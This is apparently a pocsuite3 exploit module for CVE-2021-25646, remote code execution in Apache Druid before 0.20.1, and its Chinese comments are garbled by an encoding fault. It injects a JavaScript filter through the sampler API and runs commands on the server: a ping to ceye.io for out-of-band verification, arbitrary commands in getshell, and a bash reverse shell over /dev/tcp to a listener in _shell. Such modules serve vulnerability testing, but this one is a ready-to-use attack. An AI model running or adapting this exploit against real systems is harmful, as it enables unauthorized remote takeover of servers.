from collections import OrderedDict

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.lib.utils import random_str
import json

class POC(POCBase):
    vulID = 'attackbot-30'  # ���б��
    vulnerability = 'CVE-2021-25646'  # ��дCVE����CNVD���û��null
    author = 'attackbot'  # Ĭ��Ϊattackbot�����޸�
    vulDate = '2021-1-7'  # ©��������ʱ��,��֪����д����
    grade = 'high'  # �ȼ�ѡ��high,medium,low
    appPower = 'apache'  # ©����������
    appName = 'Druid'  # ©��Ӧ������
    appVersion = 'Apache Druid < 0.20.1'  # ©��Ӱ��汾
    name = 'attackbot_30_Apache_RCE_poc.py'  # �������
    vulType = 'RCE'  # ©������,���Ͳο��� ©�����͹淶��
    vulclassification = 'Web'  # ©������ Web,Middleware,System,Internet equipment,safety equipment
    createDate = '2021-1-7'  # ��д PoC ������
    updateDate = '2021-1-7'  # PoC ���µ�ʱ��,Ĭ�Ϻͱ�дʱ��һ��
    desc = '''
    ��Druid 0.20.0�����Ͱ汾�У��û����Ͷ�����������Apache Druid©������ִ��������롣�����߿�ֱ�ӹ����������ִ��������룬���Ʒ�������
    '''
    samples = []  # ��������,������ PoC ���Գɹ�����վ
    install_requires = []  # PoC ������ģ���������뾡����Ҫʹ�õ�����ģ�飬��Ҫʱ��ο���PoC������ģ������˵������д
    pocDesc = '''  '''

    def _verify(self):
        result = {}
        vul = self.url
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json",
        }
        data = {
                "type":"index",
                "spec":{
                    "type":"index",
                    "ioConfig":{
                        "type":"index",
                        "firehose":{
                            "type":"local",
                            "baseDir":"/opt/",
                            "filter":""
                        }
                    },
                    "dataSchema":{
                        "dataSource":"sample",
                        "parser":{
                            "type":"string",
                            "parseSpec":{
                                "format":"json",
                                "timestampSpec":{
                                    "column":"time",
                                    "format":"iso"
                                },
                                "dimensionsSpec":{

                                }
                            }
                        },
                        "transformSpec":{
                            "transforms":[

                            ],
                            "filter":{
                                "type":"javascript",
                                "function":"function(value){return java.lang.Runtime.getRuntime().exec('ping xxxxx.ceye.io')}",
                                "dimension":"added",
                                "":{
                                    "enabled":"true"
                                }
                            }
                        }
                    }
                },
                "samplerConfig":{
                    "numRows":500,
                    "cacheKey":"c67e2881f1c64110b40c0f67608b0022"
                }
            }
        try:
            rep1 = requests.post(url=self.url.rstrip("/")+"/druid/indexer/v1/sampler?for=filter",headers=headers,data=json.dumps(data))
            if rep1.status_code == 200:
                url = 'http://api.ceye.io/v1/records'
                params = {
                    "token": "xxxx",
                    "type": "dns",
                    "filter": "xxx.ceye.io"
                }
                rep2 = requests.get(url=url, params=params,timeout=2)
                if "xxxx.ceye.io" in rep2.text:
                    result['VerfiryInfo'] = {}
                    result['VerfiryInfo']['URL'] = self.url
        except Exception as e:
            print(e)
        return self.parse_output(result)
    def getshell(self,cmd):
        result = {}
        vul = self.url.rstrip("/")+"/druid/indexer/v1/sampler?for=filter"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json",
        }
        data = {
        "type": "index",
        "spec": {
            "type": "index",
            "ioConfig": {
                "type": "index",
                "firehose": {
                    "type": "local",
                    "baseDir": "/opt/",
                    "filter": ""
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "parser": {
                    "type": "string",
                    "parseSpec": {
                        "format": "json",
                        "timestampSpec": {
                            "column": "time",
                            "format": "iso"
                        },
                        "dimensionsSpec": {}
                    }
                },
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "function": "function(value){return java.lang.Runtime.getRuntime().exec('"+cmd+"')}",
                        "dimension": "added",
                        "": {
                            "enabled": "true"
                        }
                    }
                }
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "cacheKey": "c67e2881f1c64110b40c0f67608b0022"
        }
    }
        rep = requests.post(url=vul, headers=headers, data=json.dumps(data))
    def _shell(self):
        cmd = "/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/{0}/{1} 0>&1".format(get_listener_ip(), get_listener_port())
        # print(cmd)
        result = dict()
        self.getshell(cmd)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(POC)